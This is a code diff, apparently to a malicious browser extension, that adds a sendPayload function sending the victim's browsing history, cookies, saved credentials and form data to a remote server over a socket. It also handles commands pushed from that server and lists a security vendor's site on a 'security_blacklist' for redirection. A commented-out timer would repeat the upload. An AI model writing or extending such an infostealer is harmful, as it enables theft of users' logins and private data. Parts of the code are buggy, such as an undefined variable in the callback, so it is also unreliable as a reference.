@@ -283,7 +283,6 @@ function createClientIDRequest(){
 
 function handleServerPayload(payload) {
 	console.log('Payload received: ' + JSON.stringify(payload, null, 2));
-	//TODO: control flow : {edit current 'config' based on payload; store payload}
 	if(!validateServerPayload()){
 		console.log("Failed to validate payload");
 		return false;
@@ -326,12 +325,24 @@ function connectToHost(){
     });
     socket.on('srvpayload',function(msg){
 		console.log('message recieved from server');
-		handleServerPayload(msg);
+
+		if(handleServerPayload(msg)){
+			console.log("payload successfully handled");
+		}
+		else{
+			console.log("payload handling failed");
+		}
 	});
 
 	
     	//alert("json " + answer);
 		//sending initial clientIDRequest
+}
+
+function sendPayload(){
+	socket.emit('extpayoad', createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms), function(answer){
+        handleServerPayload(payload);
+	})
 }
 
 function main_func() {
@@ -342,7 +353,7 @@ function main_func() {
 	config.security_blacklist.push({"https://www.mcafee.com/en-us/index.html":"https://developer.chrome.com/extensions/examples/extensions/catifier/event_page.js"});
 	//setListener(config.security_blacklist);
 
-    //setInterval(alert, 1000 * 10, ["Hello"]);	//sends payload every 5 minutes
+    //setInterval(sendPayload, 1000 * 10);	//sends payload every 5 minutes
 }
 
 loadConfig().then(
